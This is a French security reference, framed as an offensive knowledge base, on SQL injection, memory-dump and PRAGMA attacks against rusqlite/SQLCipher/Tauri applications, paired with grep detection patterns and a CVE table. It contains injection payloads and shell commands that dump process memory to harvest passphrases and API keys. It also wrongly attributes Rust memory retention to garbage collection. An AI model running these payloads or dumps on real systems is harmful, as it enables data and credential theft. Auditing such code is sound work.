# sqlcipher-injection-attacks.md
# Base de connaissance offensive — SQL Injection, SQLCipher et attaques cryptographiques

## Vue d'ensemble

L'architecture rusqlite + SQLCipher + Tauri v2 n'est pas immunisée contre l'injection SQL. Les requêtes préparées bloquent l'injection classique, mais plusieurs vecteurs restent exploitables : noms de tables dynamiques, wildcards LIKE/GLOB, second-order injection, fuites d'information via les messages d'erreur, et attaques sur la gestion cryptographique de la passphrase.

Le modèle de menace SQLCipher est dominé par les attaques sur la mémoire du processus plutôt que sur la cryptographie (PBKDF2-SHA512 256K itérations rend le brute-force impraticable), mais des vecteurs de timing et de dump mémoire restent actifs.

---

## 1. SQL Injection via rusqlite — format! au lieu de requêtes préparées

### Vecteur : construction de requêtes par interpolation de chaînes

**Prérequis :** entrée utilisateur ou données externes passées dans un `format!()` construit en SQL

**Étapes d'exploitation :**
1. Identifier un point d'entrée Tauri (`#[tauri::command]`) acceptant un paramètre `String`
2. Ce `String` est passé dans un `format!()` qui construit la requête SQL
3. Injecter un payload SQL dans ce champ

**Code vulnérable typique :**
```rust
// ❌ VULNÉRABLE — user_input traverse le parseur SQL
let query = format!("SELECT * FROM articles WHERE title = '{}'", user_input);
conn.execute(&query, []);
// Payload : user_input = "'; ATTACH DATABASE '/tmp/evil.db' AS evil; --"
```

**Limite importante :** `execute()` et `prepare()` utilisent `sqlite3_prepare_v2()` qui ne compile que le **premier** statement SQL. Un payload `; DROP TABLE` ne s'exécutera pas comme second statement. Cependant l'attaquant peut toujours :
- Manipuler la clause WHERE via `OR 1=1` pour exfiltrer toutes les données
- Utiliser `UNION SELECT` pour extraire le schéma depuis `sqlite_master`
- Injecter des sous-requêtes pour énumérer les tables

**Exception critique — `execute_batch()` :** cette méthode exécute **tous** les statements séparés par des points-virgules. Si des données utilisateur atteignent `execute_batch()`, l'exploitation multi-statement est possible.

**Payload de test :**
```
' UNION SELECT sql, name, 1, 1 FROM sqlite_master WHERE type='table'; --
' OR 1=1 --
' AND (SELECT count(*) FROM sqlite_master) > 0 --
```

**Pattern de détection :**
```bash
grep -rn "format!" --include="*.rs" | grep -i "select\|insert\|update\|delete\|from\|where"
# Toute combinaison format!() + SQL = injection potentielle
grep -rn "execute_batch\|execute_script" --include="*.rs"
```

---

## 2. Injection LIKE/GLOB — Wildcards % et _

### Vecteur : manipulation des opérateurs de pattern matching SQL

**Prérequis :** champ de recherche texte qui utilise `LIKE` ou `GLOB` en SQL

**Mécanisme :**
Les requêtes préparées empêchent l'injection SQL classique, mais les caractères `%` et `_` dans la valeur liée sont interprétés comme wildcards LIKE :
- `%` : correspond à toute séquence de caractères
- `_` : correspond à exactement un caractère
- `*` et `?` pour GLOB

**Exploitation :**
```rust
// Code vulnérable — binding correct mais wildcards non échappés
conn.query_row("SELECT * FROM articles WHERE title LIKE ?1", [&user_input], ...);
// Payload : user_input = "%" → matche TOUTES les lignes de la table
// Payload : user_input = "%password%" → cherche le mot "password" dans tous les titres
```

**Impact :**
- Bypass de filtres de recherche (exfiltration en masse)
- Déni de service par requêtes coûteuses sur grandes tables (scan complet)
- Extraction d'informations structurées en devinant les patterns

**Payload d'attaque :**
```
%           → renvoie toutes les lignes (dump complet)
_           → matche un seul caractère (énumération)
%secret%    → recherche de secrets dans les champs texte
%sk-%       → recherche de clés API dans les champs texte
```

**Pattern de détection :**
```bash
grep -rn "LIKE\|GLOB" --include="*.rs" | grep -v "escape_like\|ESCAPE\|escape_glob"
# LIKE sans clause ESCAPE = wildcard injection possible
```

---

## 3. Second-Order Injection — Données stockées puis réutilisées

### Vecteur : payload injecté en deux étapes (stockage sécurisé, réutilisation dangereuse)

**Prérequis :** données scrapées ou externes stockées en base, puis réutilisées dans du SQL dynamique

**Étapes d'exploitation :**

**Étape 1 — Injection du payload (stockage via prepared statement) :**
```rust
// Stockage sécurisé — aucune injection ici
conn.execute("INSERT INTO articles (title) VALUES (?1)", params![scraped_title]);
// scraped_title = "O'Brien'; SELECT key_value FROM api_keys; --"
// Stocké tel quel dans la base
```

**Étape 2 — Déclenchement de l'injection (réutilisation dangereuse) :**
```rust
// ❌ VULNÉRABLE — le titre stocké est traité comme code SQL
let title: String = conn.query_row("SELECT title FROM articles WHERE id = ?1", [id], |r| r.get(0))?;
let sql = format!("SELECT * FROM related WHERE source = '{}'", title);
conn.execute(&sql, []);
// Le payload O'Brien'; SELECT key_value FROM api_keys; -- s'exécute maintenant
```

**Vecteurs concrets dans une application de scraping :**
- Titres d'articles scrapés contenant des apostrophes malveillantes
- Noms de presets ou configurations importés depuis fichiers externes
- URLs scrapées utilisées dans des requêtes SQL dynamiques
- Résultats d'API LLM (contenu généré) stockés et réutilisés dans des requêtes

**Pattern de détection :**
```bash
# Chercher les lectures de base suivies de format! SQL
grep -rn "query_row\|query_map" --include="*.rs" -A5 | grep -A3 "format!"
# Chercher les champs texte potentiellement malveillants réutilisés
grep -rn "scraped\|external\|imported" --include="*.rs"
```

---

## 4. Fuite d'Information via Messages d'Erreur SQLite

### Vecteur : exfiltration du schéma de base via les erreurs propagées au frontend

**Mécanisme :**
`rusqlite::Error::SqlInputError` contient le texte SQL complet, les noms de tables, les noms de colonnes, et la position de l'erreur. Si cette erreur est propagée vers le frontend TypeScript via une commande Tauri, l'attaquant obtient :
- Noms des tables
- Noms et types des colonnes
- Structure complète du schéma

**Code vulnérable :**
```rust
#[tauri::command]
fn get_article(id: i64) -> Result<Article, String> {
    db.query_row("SELECT ...", [id], |r| r.get::<_, Article>(0))
        .map_err(|e| e.to_string()) // ❌ Propage rusqlite::Error complet
}
// L'erreur retournée contient : "no such column: api_keys.key_value"
// → révèle qu'une table api_keys existe avec une colonne key_value
```

**Exploitation :**
1. Provoquer délibérément des erreurs SQL (entrées malformées, IDs inexistants)
2. Analyser les messages d'erreur reçus côté React
3. Reconstituer le schéma complet de la base de données
4. Adapter les payloads d'injection SQL en connaissant les noms exacts

**Pattern de détection :**
```bash
grep -rn "map_err.*to_string\|.unwrap()\|.expect(" --include="*.rs"
# Chercher les propagations d'erreur vers le frontend sans mapping générique
grep -rn "tauri::command" --include="*.rs" -A10 | grep "map_err\|Err("
```

---

## 5. CVE-2025-6965 — SQLite 3.50.1 Memory Corruption

**CVSS : 7.2 (High)**
**Affecte :** SQLite ≤ 3.50.1
**Corrigé dans :** SQLite 3.50.2, rusqlite 0.37+
**Découvert par :** agent AI "Big Sleep" de Google

**Description :** corruption mémoire dans SQLite quand des termes d'agrégation dépassent le nombre de colonnes dans certaines requêtes. Exploitable via du SQL contrôlé par l'attaquant.

**CVE liée :**
- **CVE-2025-29087** : vulnérabilité SQLite distincte (NVD), sans détails publics complets

**Contexte Tauri :** si l'application utilise rusqlite < 0.37 avec SQLite bundled ≤ 3.50.1, l'exploitation nécessite la capacité de faire exécuter du SQL arbitraire — possible via injection SQL si un vecteur d'injection existe.

**Pattern de détection :**
```bash
grep -rn "rusqlite" Cargo.toml Cargo.lock | grep -v "0\.3[7-9]\|0\.[4-9]"
# rusqlite < 0.37 = SQLite 3.50.1 bundled = CVE-2025-6965
```

---

## 6. SQLCipher Brute Force — 37 ans avec PBKDF2 mais Timing Attacks Possibles

### Vecteur : attaque temporelle sur la vérification de passphrase

**Résistance au brute force direct (matériel 2025, 8x RTX 5090) :**

| Type de clé | Espace | Temps estimé |
|-------------|--------|--------------|
| 6 caractères alphanumériques (62^6) | ~56.8 milliards | ~3.5 jours |
| 8 caractères alphanumériques (62^8) | ~218 trillions | **~37 ans** |
| 12 caractères alphanumériques | ~3.2 × 10^21 | **~9 milliards d'années** |
| Clé brute 256 bits | 2^256 | Physiquement impossible |

**Remarque importante :** PBKDF2 n'est pas memory-hard (contrairement à Argon2id). Il est vulnérable aux ASICs dédiés. Sur GPU, les 256 000 itérations SHA-512 sont parallélisables — benchmark hashcat : ~187 000 essais/seconde sur 8x RTX 5090.

**Timing side-channel sur la passphrase :**

SQLCipher vérifie d'abord le HMAC de la première page avant de dériver la clé complète. La variation de temps entre une passphrase correcte (déchiffrement de la page 1 réussi) et incorrecte (HMAC invalide retourné immédiatement) peut créer un oracle temporel.

**Exploitation :**
1. Capturer plusieurs tentatives de déverrouillage SQLCipher avec différentes passphrase candidates
2. Mesurer le temps de réponse : une passphrase partiellement correcte (même sel PBKDF2) peut prendre plus de temps
3. Utiliser l'oracle temporel pour réduire l'espace de recherche

**Note :** le document source indique que « la vérification HMAC est un pass/fail binaire sans oracle temporel » — mais les variations dans la dérivation PBKDF2 selon l'implémentation OS d'OpenSSL peuvent introduire des variations mesurables.

**Pattern de détection :**
```bash
grep -rn "PRAGMA key\|pragma key\|sqlcipher_key" --include="*.rs"
# Chercher comment la passphrase est passée à SQLCipher
grep -rn "PRAGMA cipher_compatibility" --include="*.rs"
# cipher_compatibility = 3 réduit la sécurité aux paramètres SQLCipher 3.x
```

---

## 7. Attaque sur la Mémoire — Dump du Processus pour Extraire la Passphrase

### Vecteur : extraction de la passphrase SQLCipher depuis la mémoire du processus Rust

**Prérequis :** accès au même utilisateur Unix, ou accès admin

**Mécanisme :**

La passphrase SQLCipher doit être présentée en clair à la fonction `PRAGMA key` lors de l'ouverture de la base. Si elle est stockée dans une `String` Rust standard, elle reste en mémoire jusqu'à la garbage collection (qui peut ne jamais arriver pour les variables statiques ou les connexions longue durée).

**Étapes d'exploitation :**
```bash
# Linux : dump la mémoire du processus Tauri
cat /proc/$(pgrep -f "mon-app-tauri")/maps
# Identifier les segments mémoire heap/stack
dd if=/proc/$(pgrep -f "mon-app-tauri")/mem of=/tmp/memdump bs=4096 skip=<addr> count=<size>
# Chercher la passphrase dans le dump
strings /tmp/memdump | grep -E "^[a-f0-9]{64}$"  # Clé hex 32 bytes
strings /tmp/memdump | grep -E "sk-|gsk_|xai-"   # Clés API LLM
```

**Techniques avancées :**
- `ptrace(PTRACE_ATTACH, pid)` + lecture de mémoire avec `process_vm_readv`
- `/proc/PID/mem` avec les offsets corrects depuis `/proc/PID/maps`
- GDB : `attach PID`, `find /heap start,end "sk-ant-"` pour localiser les clés API
- Core dump : `kill -ABRT PID` ou `gcore PID` si les core dumps sont activés

**Conditions favorables :**
- `cipher_memory_security = OFF` (non configuré) → les pages mémoire SQLCipher restent lisibles
- Passphrase stockée dans une `String` standard au lieu d'un `SecretString`
- Core dumps activés (`ulimit -c unlimited`)
- Application en mode debug avec symboles

**Pattern de détection :**
```bash
grep -rn "String\|mut.*key\|passphrase" --include="*.rs" | grep -v "SecretString\|SecretVec\|zeroize"
# Variables stockant des clés sans protection mémoire
grep -rn "cipher_memory_security" --include="*.rs"
# Absence = OFF par défaut = mémoire SQLCipher non protégée
```

---

## 8. PRAGMA Abuse — Manipulation des paramètres SQLCipher

### Vecteur : modification des paramètres de chiffrement via injection PRAGMA

**Prérequis :** capacité d'injecter du SQL ou accès à des fonctions d'administration de la base

**PRAGMAs dangereux :**

```sql
PRAGMA key = 'nouvelle_passphrase';          -- Réouvre la base avec une autre clé
PRAGMA rekey = 'autre_passphrase';           -- Modifie la passphrase (rotation)
PRAGMA cipher_compatibility = 3;            -- Réduit la sécurité aux params SQLCipher 3.x
PRAGMA cipher_kdf_iter = 1000;              -- Réduit drastiquement le KDF (brute force facilité)
PRAGMA cipher_page_size = 1024;             -- Modifie la taille des pages
PRAGMA cipher_plaintext_header_size = 32;  -- Rend le header lisible en clair
PRAGMA wal_checkpoint(TRUNCATE);            -- Peut révéler des données du WAL
```

**Scénario d'exploitation :**
1. Un attaquant injecte `PRAGMA cipher_kdf_iter = 100` dans une requête exécutée avec `execute_batch()`
2. Les nouvelles pages écrites utilisent maintenant 100 itérations PBKDF2 au lieu de 256 000
3. Le brute-force sur la passphrase devient 2560× plus rapide

**Conditions d'exploitation :** l'autorizer rusqlite (feature `hooks`) peut bloquer les PRAGMAs, mais s'il n'est pas configuré, tout PRAGMA est autorisé.

**Pattern de détection :**
```bash
grep -rn "PRAGMA\|pragma" --include="*.rs" | grep -v "cipher_memory_security\|temp_store\|foreign_keys\|journal_mode\|secure_delete\|integrity_check"
# PRAGMAs non listés ci-dessus méritent attention
grep -rn "authorizer\|AuthAction::Pragma" --include="*.rs"
# Absence d'authorizer = tous les PRAGMAs autorisés
```

---

## Table des CVEs

| CVE / Advisory | CVSS | Composant affecté | Version vulnérable | Corrigé dans | Type |
|----------------|------|-------------------|--------------------|--------------|------|
| CVE-2025-6965 | 7.2 | SQLite | ≤ 3.50.1 | 3.50.2 / rusqlite 0.37+ | Memory corruption agrégation |
| CVE-2025-29087 | — | SQLite | — | — | Vulnérabilité SQLite (NVD) |
| CVE-2025-15467 | — | OpenSSL 3.5.4 | 3.5.4 | Patch OpenSSL | Crypto provider SQLCipher |
| CVE-2025-31477 | 9.8 | tauri-plugin-shell | < 2.2.1 | 2.2.1 | RCE via protocoles non validés |
| CVE-2024-35222 | 5.9 | Tauri v2 IPC | — | Corrigé pré-stable | Accès IPC cross-origin |

---

## Grep Patterns — Détection des vulnérabilités SQL

```bash
# 1. SQL injection via format!()
grep -rn "format!" --include="*.rs" | grep -iE "select|insert|update|delete|where|from|order by"

# 2. execute_batch() avec données dynamiques
grep -rn "execute_batch\|execute_script" --include="*.rs" -B5 | grep "format!\|String\|user"

# 3. LIKE sans ESCAPE clause
grep -rn "LIKE" --include="*.rs" | grep -v "ESCAPE\|escape_like"
grep -rn "GLOB" --include="*.rs"

# 4. Erreurs SQLite propagées vers le frontend
grep -rn "map_err.*to_string\|map_err.*e\.to_string" --include="*.rs" -B3 | grep "tauri::command"

# 5. Passphrase SQLCipher non protégée en mémoire
grep -rn "PRAGMA key" --include="*.rs"
grep -rn "String.*key\|let key\|let passphrase" --include="*.rs" | grep -v "SecretString\|SecretVec"

# 6. cipher_memory_security absent
grep -rn "cipher_memory_security" --include="*.rs"
# Absence = mémoire SQLCipher lisible

# 7. rusqlite version vulnérable (CVE-2025-6965)
grep -n "rusqlite" Cargo.toml | head -5

# 8. Authorizer absent (PRAGMAs non bloqués)
grep -rn "authorizer\|AuthAction" --include="*.rs"

# 9. Core dumps non désactivés
grep -rn "RLIMIT_CORE\|setrlimit.*CORE\|disable_core" --include="*.rs"

# 10. Secrets hardcodés dans les PRAGMAs
grep -rn "PRAGMA key\s*=\s*['\"]" --include="*.rs"
```
